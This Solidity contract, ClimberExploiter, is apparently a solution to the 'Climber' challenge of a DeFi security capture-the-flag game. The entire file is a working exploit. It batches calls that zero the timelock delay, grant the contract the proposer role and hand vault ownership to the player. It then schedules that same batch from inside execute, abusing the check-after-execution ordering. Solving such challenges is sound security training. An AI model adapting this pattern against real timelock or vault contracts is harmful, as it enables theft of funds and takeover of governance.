// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ClimberTimelock} from "./ClimberTimelock.sol";
import {ClimberVault} from "./ClimberVault.sol";
import {PROPOSER_ROLE} from "./ClimberConstants.sol";

contract ClimberExploiter {
    ClimberTimelock timelock;
    ClimberVault vault;
    address player;

    address[] targets;
    uint256[] values;
    bytes[] data;
    bytes32 salt = keccak256("SOME_SALT");

    constructor(
        ClimberTimelock _timelock,
        ClimberVault _vault,
        address _player
    ) {
        timelock = _timelock;
        vault = _vault;
        player = _player;
    }

    function schedule() external {
        timelock.schedule(targets, values, data, salt);
    }

    function attack() external {
        targets.push(address(timelock));
        values.push(0);
        data.push(abi.encodeCall(ClimberTimelock.updateDelay, (uint64(0))));

        targets.push(address(timelock));
        values.push(0);
        data.push(
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                PROPOSER_ROLE,
                address(this)
            )
        );

        targets.push(address(vault));
        values.push(0);
        data.push(
            abi.encodeWithSignature("transferOwnership(address)", player)
        );

        targets.push(address(this));
        values.push(0);
        data.push(abi.encodeWithSignature("schedule()"));

        timelock.execute(targets, values, data, salt);
    }
}
